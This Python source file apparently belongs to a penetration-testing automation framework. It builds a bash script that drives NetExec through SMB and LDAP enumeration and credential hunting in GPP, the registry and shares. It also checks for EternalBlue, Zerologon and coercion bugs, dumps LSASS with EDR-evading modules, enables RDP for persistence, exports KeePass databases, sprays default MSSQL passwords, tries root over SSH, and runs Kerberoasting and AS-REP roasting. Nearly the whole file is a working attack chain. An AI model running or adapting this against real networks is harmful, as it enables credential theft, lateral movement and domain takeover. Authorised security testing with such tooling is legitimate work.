import tempfile
from pathlib import Path
from wrappers.base import BaseTool
from core.target import TargetType


class NetExecTool(BaseTool):
    name = "netexec"

    def build_command(self) -> list[str]:
        if not self.binary:
            return []

        t = self.target
        nxc = self.binary

        # ── Resolve target string ────────────────────────────────────
        # nxc natively supports CIDR, file, or single host
        smb_hosts   = self.feed.get("smb_hosts", [])
        amass_hosts = self.feed.get("hosts", [])
        all_hosts   = smb_hosts or amass_hosts

        if all_hosts:
            hosts_file = Path(tempfile.mktemp(prefix="crushgear_nxc_", suffix=".txt"))
            hosts_file.write_text("\n".join(all_hosts) + "\n")
            target_str = str(hosts_file)
        elif t.type == TargetType.CIDR:
            target_str = t.cidr
        else:
            target_str = t.host

        # ── Credential flags ─────────────────────────────────────────
        has_creds = bool(self.username and self.password)
        if has_creds:
            cred = f"-u '{self.username}' -p '{self.password}'"
        else:
            # Null/anonymous session — tests open auth before trying creds
            cred = "-u '' -p ''"

        # ─────────────────────────────────────────────────────────────
        # Phase A: Full SMB Enumeration
        # ─────────────────────────────────────────────────────────────
        # --shares         : list all SMB shares + READ/WRITE permissions
        # --users          : enumerate domain/local users via RPC
        # --groups         : enumerate local/domain groups
        # --pass-pol       : dump password policy (lockout threshold, complexity, age)
        # --rid-brute 5000 : RID cycling (finds hidden users when --users is blocked)
        # --sessions       : list active SMB sessions (who is connected right now)
        # --loggedon-users : list users currently logged on interactively
        # --disks          : list local drives/mounted volumes
        smb_enum = (
            f"{nxc} smb {target_str} {cred} "
            f"--shares --users --groups --pass-pol "
            f"--rid-brute 5000 --sessions --loggedon-users --disks 2>&1"
        )

        # ─────────────────────────────────────────────────────────────
        # Phase B: LDAP Enumeration (Active Directory specific)
        # ─────────────────────────────────────────────────────────────
        # --user-desc           : user Description field (VERY often contains passwords)
        # --active-users        : only show active (non-disabled) accounts
        # --trusted-for-delegation : Kerberos delegation — potential impersonation
        # --password-not-required  : accounts with PASSWD_NOTREQD flag (privesc)
        # --admin-count         : AdminSDHolder protected accounts (high-value targets)
        # --get-sid             : get domain SID (needed for some AD attacks)
        # --gmsa                : Group Managed Service Account secrets (auth bypass)
        # --bloodhound          : dump BloodHound-compatible data (AD attack paths)
        ldap_enum = (
            f"{nxc} ldap {target_str} {cred} "
            f"--user-desc --active-users "
            f"--trusted-for-delegation --password-not-required "
            f"--admin-count --get-sid --gmsa 2>&1"
        )

        # ─────────────────────────────────────────────────────────────
        # Phase C: SMB Modules — Credential & Data Hunting
        # ─────────────────────────────────────────────────────────────
        cred_modules = [
            # --- GPP / Registry credential hunting ---
            "gpp_password",    # GPP passwords in SYSVOL/Policies — VERY common AD finding
            "gpp_autologin",   # Autologin credentials stored in Group Policy registry
            "reg_winlogon",    # Winlogon registry key — stores default logon credentials
            # --- Share & DNS enumeration ---
            "spider_plus",     # Spider ALL readable shares for secrets, configs, DB files
            "enum_dns",        # DNS zone transfer/enumeration via SMB (finds all A records)
            # --- Additional discovery ---
            "ioxidresolver",   # IOXIDResolver — discover additional network interfaces
        ]

        # ─────────────────────────────────────────────────────────────
        # Phase D: Vulnerability Check Modules
        # ─────────────────────────────────────────────────────────────
        vuln_modules = [
            # --- Critical RCE / Takeover ---
            "ms17-010",        # CVE-2017-0144  EternalBlue — Windows SMB RCE (unpatched)
            "zerologon",       # CVE-2020-1472  Netlogon — Domain Controller account takeover
            "printnightmare",  # CVE-2021-34527 Print Spooler — local privesc → RCE

            # --- NTLM Relay Coerce Vectors ---
            "petitpotam",      # CVE-2021-36942 NTLM relay via LSARPC (unauthenticated)
            "dfscoerce",       # CVE-2022-26925 NTLM relay via MS-DFSNM (DFSCoerce)
            "shadowcoerce",    # NTLM relay via MS-FSRVP (Shadow Copy service)
            "printerbug",      # SpoolSample — coerce authentication via MS-RPRN
            "webdav",          # WebDAV check — coerce via WebClient service (HTTP relay)

            # --- Privilege Escalation ---
            "nopac",           # CVE-2021-42278/42287 — AD sAMAccountName spoofing → DA
            "spooler",         # Print Spooler running check (PrintNightmare prerequisite)

            # --- Recon / AV Detection ---
            "enum_av",         # Detect AV/EDR/security products on remote host
        ]

        # ─────────────────────────────────────────────────────────────
        # Phase E: Post-Auth Credential Dumping (only with valid creds)
        # ─────────────────────────────────────────────────────────────
        # Only run when credentials are provided — these require auth
        postauth_modules = [
            # --- LSASS credential dumping ---
            "lsassy",          # Remote LSASS dump via various methods (no binary on target)
            "nanodump",        # Stealthy LSASS dump — minimal EDR footprint
            "handlekatz",      # LSASS dump via handle duplication (bypasses some AV)
            "mimikatz",        # Full credential dump via mimikatz (classic, noisy)
            # --- Persistence ---
            "rdp",             # Enable RDP for persistent remote access
            # --- Password Manager hunting ---
            "keepass_discover",# Locate KeePass databases (.kdbx) on remote host
            "keepass_trigger", # Export KeePass database using trigger mechanism
        ]

        # ── Pull per-protocol host lists from nmap feed ──────────────
        winrm_hosts  = self.feed.get("winrm_hosts", [])
        mssql_hosts  = self.feed.get("mssql_hosts", [])
        rdp_hosts    = self.feed.get("rdp_hosts", [])
        ssh_hosts    = self.feed.get("ssh_hosts", [])
        dc_hosts     = self.feed.get("dc_hosts", [])

        def _hostfile(hosts: list, prefix: str) -> str:
            """Write a list of hosts to a temp file and return its path."""
            import tempfile as _tf
            f = Path(_tf.mktemp(prefix=f"crushgear_nxc_{prefix}_", suffix=".txt"))
            f.write_text("\n".join(hosts) + "\n")
            return str(f)

        # ─────────────────────────────────────────────────────────────
        # Build the complete bash script
        # ─────────────────────────────────────────────────────────────
        parts = [
            "echo ''; echo '=== NetExec: Phase A — SMB Enumeration ==='",
            smb_enum,
            "echo ''; echo '=== NetExec: Phase B — LDAP / Active Directory ==='",
            ldap_enum,
            "echo ''; echo '=== NetExec: Phase C — Credential Hunting (GPP/Registry/Spider) ==='",
        ]

        for mod in cred_modules:
            parts.append(f"{nxc} smb {target_str} {cred} -M {mod} 2>&1")

        parts += [
            "echo ''; echo '=== NetExec: Phase D — Vulnerability Checks ==='",
        ]
        for mod in vuln_modules:
            parts.append(f"{nxc} smb {target_str} {cred} -M {mod} 2>&1")

        if has_creds:
            parts += [
                "echo ''; echo '=== NetExec: Phase E — Post-Auth Credential Dumping ==='",
            ]
            for mod in postauth_modules:
                parts.append(f"{nxc} smb {target_str} {cred} -M {mod} 2>&1")

        # ── Phase F: WinRM (port 5985/5986) — PowerShell Remoting ────
        # WinRM enables remote cmd/PowerShell execution; if creds work
        # this yields an immediate interactive shell.
        if winrm_hosts:
            wf = _hostfile(winrm_hosts, "winrm")
            parts.append("echo ''; echo '=== NetExec: Phase F — WinRM (PowerShell Remoting) ==='")
            parts.append(f"{nxc} winrm {wf} {cred} 2>&1")
            if has_creds:
                parts.append(
                    f"{nxc} winrm {wf} {cred} -x 'whoami /all; hostname; ipconfig /all' 2>&1"
                )

        # ── Phase G: MSSQL (port 1433) ───────────────────────────────
        # Test SA and common default passwords; if auth succeeds,
        # xp_cmdshell delivers OS-level command execution.
        if mssql_hosts:
            mf = _hostfile(mssql_hosts, "mssql")
            parts.append("echo ''; echo '=== NetExec: Phase G — MSSQL ==='")
            for sa_pass in ("", "sa", "password", "Password1", "admin", "123456"):
                parts.append(f"{nxc} mssql {mf} -u 'sa' -p '{sa_pass}' 2>&1")
            if has_creds:
                parts.append(
                    f"{nxc} mssql {mf} {cred} -q 'SELECT @@version, SYSTEM_USER, DB_NAME()' 2>&1"
                )
                parts.append(f"{nxc} mssql {mf} {cred} --local-auth 2>&1")
                parts.append(f"{nxc} mssql {mf} {cred} -x 'whoami' 2>&1")

        # ── Phase H: SSH (port 22) ────────────────────────────────────
        # Banner grab + credential validation; also tries root with same
        # password (very common misconfiguration on Linux targets).
        if ssh_hosts:
            sf = _hostfile(ssh_hosts, "ssh")
            parts.append("echo ''; echo '=== NetExec: Phase H — SSH ==='")
            parts.append(f"{nxc} ssh {sf} 2>&1")
            if has_creds:
                parts.append(f"{nxc} ssh {sf} {cred} -x 'id; uname -a; whoami' 2>&1")
                parts.append(
                    f"{nxc} ssh {sf} -u 'root' -p '{self.password}' -x 'id' 2>&1"
                )

        # ── Phase I: RDP (port 3389) ──────────────────────────────────
        # Fingerprint NLA/security layer and validate credentials.
        if rdp_hosts:
            rf = _hostfile(rdp_hosts, "rdp")
            parts.append("echo ''; echo '=== NetExec: Phase I — RDP ==='")
            parts.append(f"{nxc} rdp {rf} 2>&1")
            if has_creds:
                parts.append(f"{nxc} rdp {rf} {cred} 2>&1")

        # ── Phase J: DC Deep Enumeration (BloodHound + Kerberos) ─────
        # Full BloodHound collection + AS-REP / Kerberoasting when DCs
        # are identified from nmap (Kerberos port 88 + LDAP 389/636).
        if dc_hosts:
            dcf = _hostfile(dc_hosts, "dc")
            parts.append(
                "echo ''; echo '=== NetExec: Phase J — Domain Controller (BloodHound + Kerberos Attacks) ==='"
            )
            parts.append(f"{nxc} ldap {dcf} {cred} --bloodhound -c All 2>&1")
            parts.append(
                f"{nxc} ldap {dcf} {cred} --asreproast /tmp/crushgear_asrep.txt 2>&1"
            )
            parts.append(
                f"{nxc} ldap {dcf} {cred} --kerberoasting /tmp/crushgear_kerbroast.txt 2>&1"
            )

        return ["bash", "-c", "; ".join(parts)]
